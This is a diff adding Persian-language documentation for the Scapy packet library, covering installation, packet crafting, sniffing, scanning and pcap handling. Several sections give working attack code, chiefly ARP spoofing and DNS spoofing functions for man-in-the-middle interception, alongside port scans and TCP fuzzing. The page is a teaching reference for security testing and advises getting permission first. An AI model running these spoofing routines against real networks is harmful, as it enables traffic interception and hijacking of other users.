@@ -1,0 +1,380 @@
+---
+title: Scapy
+description: کتابخانه دستکاری بسته مبتنی بر Python برای تست امنیت شبکه
+---
+
+## Scapy چیست؟
+
+Scapy یک کتابخانه قدرتمند Python است که برای ساخت، ارسال، تشخیص و تجزیه و تحلیل بسته‌های شبکه استفاده می‌شود. به طور گسترده توسط تست‌کنندگان نفوذ و محققان امنیتی برای ایجاد بسته سفارشی و تجزیه و تحلیل پروتکل شبکه استفاده می‌شود.
+
+## ویژگی‌های کلیدی
+
+- ساخت و دستکاری بسته
+- ارسال/دریافت بسته‌ها
+- تشخیص و ضبط بسته
+- رمزگشایی پروتکل
+- اسکن شبکه
+- مسمومیت ARP
+- پیاده‌سازی پروتکل سفارشی
+- بازپخش و تغییر بسته
+
+## نصب
+
+### Linux
+```bash
+# Debian/Ubuntu
+sudo apt-get install python3-scapy
+
+# استفاده از pip
+pip3 install scapy
+```
+
+### Windows
+```powershell
+pip install scapy
+```
+
+### macOS
+```bash
+pip3 install scapy
+```
+
+## استفاده پایه
+
+### حالت تعاملی
+```python
+# شروع shell تعاملی Scapy
+sudo scapy
+
+# یا از Python
+from scapy.all import *
+```
+
+### ایجاد بسته ساده
+```python
+# ایجاد یک بسته ICMP
+packet = IP(dst="192.168.1.1")/ICMP()
+
+# ارسال بسته
+send(packet)
+
+# ارسال و دریافت
+response = sr1(packet)
+```
+
+## ساخت بسته
+
+### لایه 3 - بسته‌های IP
+```python
+# بسته IP پایه
+ip = IP(dst="192.168.1.1")
+
+# با گزینه‌ها
+ip = IP(dst="192.168.1.1", ttl=64, id=12345)
+
+# مقاصد متعدد
+ip = IP(dst=["192.168.1.1", "192.168.1.2"])
+```
+
+### لایه 4 - TCP/UDP
+```python
+# بسته TCP
+tcp = TCP(dport=80, flags="S")
+
+# بسته UDP
+udp = UDP(dport=53)
+
+# بسته کامل TCP SYN
+packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
+```
+
+### لایه 7 - داده برنامه
+```python
+# درخواست HTTP GET
+packet = IP(dst="192.168.1.1")/TCP(dport=80)/"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
+
+# کوئری DNS
+dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
+```
+
+## عملیات بسته
+
+### ارسال بسته‌ها
+
+```python
+# ارسال در لایه 3 (IP)
+send(packet)
+
+# ارسال در لایه 2 (Ethernet)
+sendp(packet)
+
+# ارسال و دریافت یک بسته
+response = sr1(packet, timeout=2)
+
+# ارسال و دریافت بسته‌های متعدد
+answered, unanswered = sr(packet, timeout=2)
+```
+
+### تشخیص بسته‌ها
+
+```python
+# تشخیص 10 بسته
+packets = sniff(count=10)
+
+# تشخیص در رابط خاص
+packets = sniff(iface="eth0", count=10)
+
+# تشخیص با فیلتر (سینتکس BPF)
+packets = sniff(filter="tcp port 80", count=10)
+
+# پردازش زنده بسته
+def packet_callback(packet):
+    print(packet.summary())
+
+sniff(prn=packet_callback, count=10)
+```
+
+### تجزیه و تحلیل بسته
+
+```python
+# نمایش جزئیات بسته
+packet.show()
+
+# خلاصه
+packet.summary()
+
+# دسترسی به لایه‌های خاص
+packet[IP].src
+packet[TCP].dport
+
+# بررسی وجود لایه
+if packet.haslayer(TCP):
+    print("TCP packet")
+
+# نمایش hexdump
+hexdump(packet)
+```
+
+## اسکن شبکه
+
+### اسکن TCP SYN
+```python
+# اسکن هاست واحد
+def syn_scan(target, ports):
+    for port in ports:
+        packet = IP(dst=target)/TCP(dport=port, flags="S")
+        response = sr1(packet, timeout=1, verbose=0)
+        
+        if response and response.haslayer(TCP):
+            if response[TCP].flags == 0x12:  # SYN-ACK
+                print(f"Port {port}: Open")
+                # ارسال RST برای بستن اتصال
+                rst = IP(dst=target)/TCP(dport=port, flags="R")
+                send(rst, verbose=0)
+            elif response[TCP].flags == 0x14:  # RST-ACK
+                print(f"Port {port}: Closed")
+
+# استفاده
+syn_scan("192.168.1.1", [80, 443, 22, 21])
+```
+
+### اسکن UDP
+```python
+def udp_scan(target, ports):
+    for port in ports:
+        packet = IP(dst=target)/UDP(dport=port)
+        response = sr1(packet, timeout=2, verbose=0)
+        
+        if response is None:
+            print(f"Port {port}: Open|Filtered")
+        elif response.haslayer(ICMP):
+            if response[ICMP].type == 3 and response[ICMP].code == 3:
+                print(f"Port {port}: Closed")
+
+# استفاده
+udp_scan("192.168.1.1", [53, 161, 123])
+```
+
+### کشف هاست
+```python
+# پینگ ICMP روی شبکه
+def ping_sweep(network):
+    answered, unanswered = sr(IP(dst=network)/ICMP(), timeout=2, verbose=0)
+    
+    for sent, received in answered:
+        print(f"{received.src} is alive")
+
+# استفاده
+ping_sweep("192.168.1.0/24")
+```
+
+## عملیات ARP
+
+### اسکن ARP
+```python
+# کشف هاست‌ها در شبکه محلی
+def arp_scan(network):
+    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
+                                 timeout=2, verbose=0)
+    
+    for sent, received in answered:
+        print(f"IP: {received.psrc}\tMAC: {received.hwsrc}")
+
+# استفاده
+arp_scan("192.168.1.0/24")
+```
+
+### جعل ARP
+```python
+def arp_spoof(target_ip, gateway_ip):
+    target_mac = getmacbyip(target_ip)
+    
+    # ایجاد بسته ARP
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, 
+                       psrc=gateway_ip, op='is-at')
+    
+    # ارسال مداوم
+    send(arp_response, verbose=0)
+
+# ابتدا فوروارد IP را فعال کنید!
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+## تکنیک‌های پیشرفته
+
+### Traceroute
+```python
+def traceroute(target, max_hops=30):
+    for ttl in range(1, max_hops + 1):
+        packet = IP(dst=target, ttl=ttl)/ICMP()
+        response = sr1(packet, timeout=2, verbose=0)
+        
+        if response is None:
+            print(f"{ttl}\t*")
+        elif response.type == 0:  # Echo reply
+            print(f"{ttl}\t{response.src} (Destination)")
+            break
+        else:
+            print(f"{ttl}\t{response.src}")
+
+# استفاده
+traceroute("8.8.8.8")
+```
+
+### اثر انگشت سیستم عامل
+```python
+def os_fingerprint(target):
+    # ارسال بسته‌های مختلف
+    syn = IP(dst=target)/TCP(dport=80, flags="S")
+    syn_response = sr1(syn, timeout=2, verbose=0)
+    
+    if syn_response:
+        # تجزیه و تحلیل گزینه‌های TCP
+        if syn_response.haslayer(TCP):
+            ttl = syn_response[IP].ttl
+            window = syn_response[TCP].window
+            
+            print(f"TTL: {ttl}")
+            print(f"Window Size: {window}")
+            
+            # تشخیص پایه OS
+            if ttl <= 64:
+                print("Likely Linux/Unix")
+            elif ttl <= 128:
+                print("Likely Windows")
+
+# استفاده
+os_fingerprint("192.168.1.1")
+```
+
+### جعل DNS
+```python
+def dns_spoof(pkt):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname
+        
+        # ایجاد پاسخ DNS جعلی
+        spoof_response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                        UDP(dport=pkt[UDP].sport, sport=53)/\
+                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                            an=DNSRR(rrname=qname, ttl=10, rdata="1.2.3.4"))
+        
+        send(spoof_response, verbose=0)
+
+# تشخیص و جعل
+sniff(filter="udp port 53", prn=dns_spoof)
+```
+
+## خواندن/نوشتن بسته
+
+### ذخیره بسته‌ها
+```python
+# ضبط و ذخیره
+packets = sniff(count=100)
+wrpcap("capture.pcap", packets)
+```
+
+### خواندن فایل‌های PCAP
+```python
+# خواندن بسته‌های ذخیره شده
+packets = rdpcap("capture.pcap")
+
+# پردازش بسته‌ها
+for packet in packets:
+    if packet.haslayer(TCP):
+        print(packet[TCP].dport)
+```
+
+## توابع مفید
+
+### حل آدرس MAC
+```python
+# دریافت MAC از IP
+mac = getmacbyip("192.168.1.1")
+
+# جستجوی معکوس
+conf.checkIPaddr = False
+```
+
+### تصادفی‌سازی
+```python
+# IP منبع تصادفی
+packet = IP(src=RandIP(), dst="192.168.1.1")/ICMP()
+
+# آدرس MAC تصادفی
+packet = Ether(src=RandMAC())/IP(dst="192.168.1.1")/ICMP()
+```
+
+## فازینگ پروتکل
+
+### فازینگ TCP
+```python
+# ارسال بسته‌ها با مقادیر تصادفی
+for i in range(100):
+    packet = IP(dst="192.168.1.1")/TCP(dport=80, flags=RandShort())
+    send(packet, verbose=0)
+```
+
+## بهترین روش‌ها
+
+1. **همیشه مجوز بگیرید** قبل از تست
+2. **از timeout مناسب استفاده کنید** برای جلوگیری از هنگ
+3. **استثناها را درست مدیریت کنید**
+4. **محدود کردن نرخ** اسکن‌های خود
+5. **نتایج را ذخیره کنید** برای تجزیه و تحلیل
+6. **پرحرف باشید** هنگام یادگیری، ساکت در تولید
+
+## موارد استفاده رایج
+
+- **اسکن پورت**: تکنیک‌های اسکن سفارشی
+- **کشف شبکه**: تشخیص هاست و سرویس
+- **تشخیص بسته**: تجزیه و تحلیل ترافیک شبکه
+- **حملات MITM**: جعل ARP، جعل DNS
+- **فازینگ**: تست پروتکل
+- **پروتکل‌های سفارشی**: پیاده‌سازی و تست
+
+## منابع
+
+- مستندات رسمی: https://scapy.readthedocs.io/
+- GitHub: https://github.com/secdev/scapy
+- آموزش: https://scapy.readthedocs.io/en/latest/usage.html
